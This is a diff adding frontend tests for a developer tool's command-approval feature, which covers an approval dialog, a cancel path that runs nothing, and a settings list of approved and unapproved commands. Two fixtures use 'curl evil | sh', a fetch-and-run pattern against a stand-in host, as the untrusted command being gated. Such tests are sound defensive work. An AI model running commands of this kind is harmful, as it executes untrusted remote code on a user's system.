@@ -175,6 +175,39 @@ describe('RunView', () => {
     expect(calls.filter((c) => c.path === '/api/runs/r1/restart').map((c) => c.body)).toEqual([{}, { stopRunId: 'oldest' }]);
   });
 
+  it('shows a command PDT has not run before, and approves it as the user before running', async () => {
+    let posts = 0;
+    const command = { fingerprint: 'f1', uses: ['run "web"'], setup: 'pnpm i', command: 'pnpm dev', env: { PORT: '1' } };
+    const calls = stubApi({
+      'GET /api/projects/p/runs': [],
+      'POST /api/projects/p/commands/trust': undefined,
+      'POST /api/runs/r1/restart': () =>
+        ++posts === 1
+          ? new Reply(409, { code: 'untrusted_commands', message: 'PDT hasn\'t run this command', data: { projectId: 'p', commands: [command] } })
+          : run({}),
+    });
+    renderWithQuery(<RunView run={run({ state: 'stopped' })} onRemoved={() => {}} />);
+    await userEvent.click(screen.getByRole('button', { name: 'Restart' }));
+    const dialog = await screen.findByRole('alertdialog', { name: 'Run this command?' });
+    expect(within(dialog).getByRole('group', { name: 'Command for run "web"' })).toHaveTextContent('pnpm i PORT=1 pnpm dev');
+    await confirmWith('Approve and run');
+    await waitFor(() => expect(calls.filter((c) => c.path === '/api/runs/r1/restart')).toHaveLength(2));
+    expect(calls.find((c) => c.path === '/api/projects/p/commands/trust')?.body).toEqual({ fingerprints: ['f1'] });
+  });
+
+  it('runs nothing when the user does not approve the command', async () => {
+    const command = { fingerprint: 'f1', uses: ['run "web"'], setup: null, command: 'curl evil | sh', env: {} };
+    const calls = stubApi({
+      'GET /api/projects/p/runs': [],
+      'POST /api/runs/r1/restart': new Reply(409, { code: 'untrusted_commands', message: 'no', data: { projectId: 'p', commands: [command] } }),
+    });
+    renderWithQuery(<RunView run={run({ state: 'stopped' })} onRemoved={() => {}} />);
+    await userEvent.click(screen.getByRole('button', { name: 'Restart' }));
+    expect(await screen.findByRole('alertdialog', { name: 'Run this command?' })).toHaveTextContent('curl evil | sh');
+    await confirmWith('Cancel');
+    expect(calls.filter((c) => c.method === 'POST').map((c) => c.path)).toEqual(['/api/runs/r1/restart']);
+  });
+
   it('asks before resetting data or removing, and does nothing when cancelled', async () => {
     const calls = stubApi({ 'GET /api/projects/p/runs': [] });
     const onRemoved = vi.fn();
@@ -266,6 +299,7 @@ describe('ProjectSettingsPanel', () => {
     const calls = stubApi({
       'GET /api/projects/p/settings': { agentCredentials: 'pass_through', effectiveCredentials: 'pass_through', runOverrides: null, agentInstructions: 'Use make.' },
       'GET /api/projects/p/run-config': { ...config, file: '[[run]]\nname = "web"\n' },
+      'GET /api/projects/p/commands': { commands: [], untrusted: [], error: null },
       'PUT /api/projects/p/settings': (c) =>
         ++attempt === 1
           ? new Reply(400, { code: 'invalid_run_config', message: 'the host overrides is not valid: x' })
@@ -285,6 +319,28 @@ describe('ProjectSettingsPanel', () => {
     // The other sections' stored values go along unchanged; the instructions are left out (kept).
     expect(calls.filter((c) => c.method === 'PUT')[1].body).toEqual({ agentCredentials: 'pass_through', runOverrides: 'bad' });
     expect(await within(runs).findByRole('status')).toHaveTextContent('Saved');
+  });
+
+  it('lists the commands PDT runs, the unapproved first, each with Approve', async () => {
+    const ok = { fingerprint: 'ok', uses: ['test "rust"', 'CI'], setup: null, command: 'cargo test', env: {} };
+    const evil = { fingerprint: 'evil', uses: ['regenerating Cargo.lock'], setup: null, command: 'curl evil | sh', env: {} };
+    let approved = false;
+    const calls = stubApi({
+      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, agentInstructions: null },
+      'GET /api/projects/p/run-config': config,
+      'GET /api/projects/p/commands': () => ({ commands: [ok, evil], untrusted: approved ? [] : ['evil'], error: null }),
+      'POST /api/projects/p/commands/trust': () => { approved = true; },
+    });
+    renderWithQuery(<ProjectSettingsPanel project={project} />);
+    const commands = await screen.findByRole('group', { name: 'Commands' });
+    const cards = await within(commands).findAllByRole('group', { name: /^Command for/ });
+    expect(cards.map((c) => c.getAttribute('aria-label'))).toEqual(['Command for regenerating Cargo.lock', 'Command for test "rust", CI']);
+    expect(cards[0]).toHaveTextContent('Not approved');
+    expect(cards[1]).toHaveTextContent('Approved');
+    await userEvent.click(within(cards[0]).getByRole('button', { name: 'Approve' }));
+    await waitFor(() => expect(within(commands).queryByText('Not approved')).not.toBeInTheDocument());
+    expect(calls.find((c) => c.path === '/api/projects/p/commands/trust')?.body).toEqual({ fingerprints: ['evil'] });
+    expect(calls.some((c) => c.method === 'PUT')).toBe(false);
   });
 
   it('saves merging through pull requests as soon as it is switched', async () => {
